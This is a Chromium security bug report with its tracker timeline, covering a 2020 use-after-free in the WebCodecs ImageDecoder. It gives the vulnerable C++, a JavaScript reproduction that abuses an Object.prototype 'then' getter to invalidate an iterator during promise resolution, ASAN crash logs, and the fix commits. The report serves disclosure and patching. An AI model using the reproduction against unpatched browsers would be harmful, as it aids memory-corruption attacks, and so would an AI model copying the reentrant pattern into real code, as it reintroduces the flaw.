# Security: UAF in ImageDecoderExternal due to iterator invalidation

| Field | Value |
|-------|-------|
| **Issue ID** | [40052921](https://issues.chromium.org/issues/40052921) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Bindings, Blink>Media>WebCodecs |
| **Platforms** | Android, Fuchsia, Linux, Windows, ChromeOS |
| **Reporter** | tj...@theori.io |
| **Assignee** | da...@chromium.org |
| **Created** | 2020-07-22 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

Promises in JavaScript are not resolved synchronously; a microtask is posted to run the callback. But according to the spec for promise resolution (<https://tc39.es/ecma262/#sec-promise-resolve-functions>), when |resolution| is an object, |Get(resolution, "then")| will be called. So If user script defines a getter for "then" in the Object prototype, the getter will run synchronously any time a promise is resolved with an object.

In third\_party/blink/renderer/modules/webcodecs/image\_decoder\_external.cc,

ScriptPromise ImageDecoderExternal::decode(uint32\_t frame\_index,  

bool complete\_frames\_only) {  

DVLOG(1) << **func**;

auto\* resolver = MakeGarbageCollected<ScriptPromiseResolver>(script\_state\_);  

auto promise = resolver->Promise();  

pending\_decodes\_.push\_back(MakeGarbageCollected<DecodeRequest>(  

resolver, frame\_index, complete\_frames\_only));  

MaybeSatisfyPendingDecodes();  

return promise;  

}

...  

void ImageDecoderExternal::MaybeSatisfyPendingDecodes() {  

DCHECK(decoder\_);  

for (auto& request : pending\_decodes\_) {  

...  

request->resolver->Resolve(result); // can run script, invalidate iterator  

}

auto\* new\_end =  

std::remove\_if(pending\_decodes\_.begin(), pending\_decodes\_.end(),  

[](const auto& request) { return request->complete; });  

pending\_decodes\_.Shrink(  

static\_cast<wtf\_size\_t>(new\_end - pending\_decodes\_.begin()));  

}

**VERSION**  

Requires --enable-blink-features=WebCodecs

**REPRODUCTION CASE**

<html>
<head>
<script>
let imageIndex = 0;
```
  function decodeImage(imageByteStream) {  
    let imageDecoder = new ImageDecoder({data: imageByteStream, type: "image/gif"});  
    let count = 0;  
    Object.defineProperty(Object.prototype, "then", { get() {  
      if (count++ == 0) {  
        for (var i = 0; i < 4; i++) imageDecoder.decode(imageIndex++).then(() => {});  
      }  
    }});  
    imageDecoder.decode(imageIndex++).then(() => {});  
    imageDecoder.decode(imageIndex++).then(() => {});  
  }  
  fetch("/animated.gif").then(response => decodeImage(response.body))  

```
 </script>
</head>
</html>

animated.gif attached

ASAN log:  

==55092==ERROR: AddressSanitizer: use-after-poison on address 0x7ec3e249e6c0 at pc 0x7ff57bd74601 bp 0x7ffc77795bd0 sp 0x7ffc77795bc8  

READ of size 8 at 0x7ec3e249e6c0 thread T0 (chrome)  

#0 0x7ff57bd74600 in blink::MemberBase<blink::ImageDecoderExternal::DecodeRequest, (blink::TracenessMemberConfiguration)0>::GetRaw() const third\_party/blink/renderer/platform/heap/member.h:250:44  

#1 0x7ff57bd66f04 in blink::MemberBase<blink::ImageDecoderExternal::DecodeRequest, (blink::TracenessMemberConfiguration)0>::operator->() const third\_party/blink/renderer/platform/heap/member.h:185:34  

#2 0x7ff57bd63642 in blink::ImageDecoderExternal::MaybeSatisfyPendingDecodes() third\_party/blink/renderer/modules/webcodecs/image\_decoder\_external.cc:297:11  

#3 0x7ff57bd61f9d in blink::ImageDecoderExternal::OnStateChange() third\_party/blink/renderer/modules/webcodecs/image\_decoder\_external.cc:231:5  

#4 0x7ff597a289bf in blink::ReadableStreamBytesConsumer::OnRead(blink::DOMTypedArray<unsigned char, v8::Uint8Array, false>\*) third\_party/blink/renderer/core/fetch/readable\_stream\_bytes\_consumer.cc:199:14  

#5 0x7ff597a2b404 in blink::ReadableStreamBytesConsumer::OnFulfilled::Call(blink::ScriptValue) third\_party/blink/renderer/core/fetch/readable\_stream\_bytes\_consumer.cc:57:16  

#6 0x7ff59546778a in blink::ScriptFunction::CallRaw(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) third\_party/blink/renderer/bindings/core/v8/script\_function.cc:38:7  

#7 0x7ff595466e71 in blink::ScriptFunction::CallCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) third\_party/blink/renderer/bindings/core/v8/script\_function.cc:48:20  

#8 0x7ff5834c7d45 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) v8/src/api/api-arguments-inl.h:158:3  

#9 0x7ff5834c4347 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8:  

:internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:111:36  

#10 0x7ff5834c0854 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:141:5  

#11 0x7ff5834bf8fc in v8::internal::Builtin\_HandleApiCall(int, unsigned long\*, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:129:1  

#12 0x7ff582db81be in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit (/home/tjbecker/chromium/src/out/linux-asan/libv8.so+0x149b1be)  

#13 0x7ff582f40733 in Builtins\_PromiseFulfillReactionJob (/home/tjbecker/chromium/src/out/linux-asan/libv8.so+0x1623733)  

#14 0x7ff582c0dbf4 in Builtins\_RunMicrotasks (/home/tjbecker/chromium/src/out/linux-asan/libv8.so+0x12f0bf4)  

#15 0x7ff582b69e57 in Builtins\_JSRunMicrotasksEntry (/home/tjbecker/chromium/src/out/linux-asan/libv8.so+0x124ce57)

PATCH

A copy of pending\_decodes\_ should be iterated instead.

**CREDIT INFORMATION**  

Reporter credit: Tim Becker of Theori

## Attachments

- [animated.gif](attachments/animated.gif) (image/gif, 80.5 KB)

## Timeline

### aj...@google.com (2020-07-22)

This reproduces:-

[18168:39048:0722/160958.851:ERROR:paint_controller.cc(634)] PaintController::FinishCycle() completed
=================================================================
==18168==ERROR: AddressSanitizer: use-after-poison on address 0x7e9eefee52d8 at pc 0x7ffc4e0ed104 bp 0x00443dffdb60 sp 0x00443dffdba8
READ of size 8 at 0x7e9eefee52d8 thread T0
==18168==*** WARNING: Failed to initialize DbgHelp!              ***
==18168==*** Most likely this means that the app is already      ***
==18168==*** using DbgHelp, possibly with incompatible flags.    ***
==18168==*** Due to technical reasons, symbolization might crash ***
==18168==*** or produce wrong results.                           ***
    #0 0x7ffc4e0ed103 in blink::ImageDecoderExternal::MaybeSatisfyPendingDecodes C:\src\chromium\src\third_party\blink\renderer\modules\webcodecs\image_decoder_external.cc
    #1 0x7ffc4e0ea97c in blink::ImageDecoderExternal::OnStateChange C:\src\chromium\src\third_party\blink\renderer\modules\webcodecs\image_decoder_external.cc:231
 

### aj...@google.com (2020-07-22)

Adding owner based on git blame, impact=None as this is behind a blink flag.

Please investigate and fix this security issue.

[Monorail components: Blink>Media>WebCodecs]

### da...@chromium.org (2020-07-22)

Thanks for filing!

### da...@chromium.org (2020-07-23)

[Empty comment from Monorail migration]

### da...@chromium.org (2020-07-29)

[Empty comment from Monorail migration]

### da...@chromium.org (2020-07-30)

This is pretty easy to fix for ImageDecoder, but I wonder if there's a common pattern that should be used to avoid issues like this. +Blink>Bindings folks which is where the Promise wrappers seem to live at least.

ScriptForbiddenScope could be used, but I'm unclear when it's appropriate to use that.

[Monorail components: Blink>Bindings]

### da...@chromium.org (2020-07-30)

[Empty comment from Monorail migration]

### ez...@google.com (2020-07-30)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/98404e916aaa532883f2ec69d0ac13f3f8cd76af

commit 98404e916aaa532883f2ec69d0ac13f3f8cd76af
Author: Dale Curtis <dalecurtis@chromium.org>
Date: Fri Jul 31 20:15:54 2020

[webcodecs] Avoid reentrancy from JS when fulfilling promises.

Apparently JS can synchronously run during promise fulfillment, so
we need to avoid doing that inside of an iterator they can invalidate.

Since we didn't have any tests for ImageDecoder yet, this adds a bunch
of basic ones and fixes the issues that arose from them. Specifically:
- GIFImageDecoder allows decoding of any image SkCodec can decode.
- There was no exception for empty image data.
- MaybeSatisfyPendingMetadataDecodes() always satisfied regardless of
whether or not the size was actually available yet.

R=pkasting, tguilbert

Fixed: 1108535
Test: New tests.
Change-Id: I96d6d37fc7ba7b6bec409330c6c0e654fd3ff202
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2331131
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Peter Kasting <pkasting@chromium.org>
Reviewed-by: Thomas Guilbert <tguilbert@chromium.org>
Cr-Commit-Position: refs/heads/master@{#793725}

[modify] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/renderer/modules/webcodecs/BUILD.gn
[modify] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc
[modify] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/renderer/modules/webcodecs/image_decoder_external.h
[add] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/renderer/modules/webcodecs/image_decoder_external_test.cc
[modify] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/renderer/platform/image-decoders/gif/gif_image_decoder.cc
[add] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/web_tests/http/tests/webcodecs/basic_image_decoding.html
[add] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/web_tests/http/tests/webcodecs/image_decoder_exact_mime_type.html
[add] https://crrev.com/98404e916aaa532883f2ec69d0ac13f3f8cd76af/third_party/blink/web_tests/http/tests/webcodecs/image_decoder_reentrant_decode.html


### [Deleted User] (2020-08-01)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-03)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-08-05)

dalecurtis@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### ad...@google.com (2020-08-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-05)

Congratulations! The VRP panel decided to award $7,500 for this report. Someone from our finance team will be in touch to arrange payment.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/319748878b549eca64367e59713757050410bdc7

commit 319748878b549eca64367e59713757050410bdc7
Author: Jeremy Roman <jbroman@chromium.org>
Date: Thu Aug 06 02:05:39 2020

[webcodecs] Use std::stable_partition to gather completed decodes.

std::remove_if is incorrect, since it leaves the elements past the new
end iterator in an unspecified state, but the code now accesses these
elements in order to copy them to |completed_decodes|.

This is not a purely theoretical concern: the natural implementation of
std::remove_if works by keeping an output and input iterator into the
range, moving an element from the input to the output iterator if the
removal predicate does not apply. But consider this sequence:

  [complete, incomplete]

std::remove_if can legally (and likely will) transform it into the
following (noting that for blink::Member, moves are copies).

  [incomplete, incomplete]

After which the incomplete request will be erroneously resolved.

Instead, std::stable_partition should be used, which returns the
partition point, to the left of which contains the matching elements and
to the right of which are the non-matching elements. Like
std::remove_if, order is preserved (for the elements where the value was
specified). Note that the sense of the predicate is reversed here.

Bug: 1108535
Change-Id: I52191943094042c09428f09857d5f62e3810e8d4
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2340367
Commit-Queue: Dale Curtis <dalecurtis@chromium.org>
Reviewed-by: Dale Curtis <dalecurtis@chromium.org>
Auto-Submit: Jeremy Roman <jbroman@chromium.org>
Cr-Commit-Position: refs/heads/master@{#795307}

[modify] https://crrev.com/319748878b549eca64367e59713757050410bdc7/third_party/blink/renderer/modules/webcodecs/image_decoder_external.cc


### ad...@google.com (2020-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-07)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-11-07)

This issue was migrated from crbug.com/chromium/1108535?no_tracker_redirect=1

[Multiple monorail components: Blink>Bindings, Blink>Media>WebCodecs]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052921)*
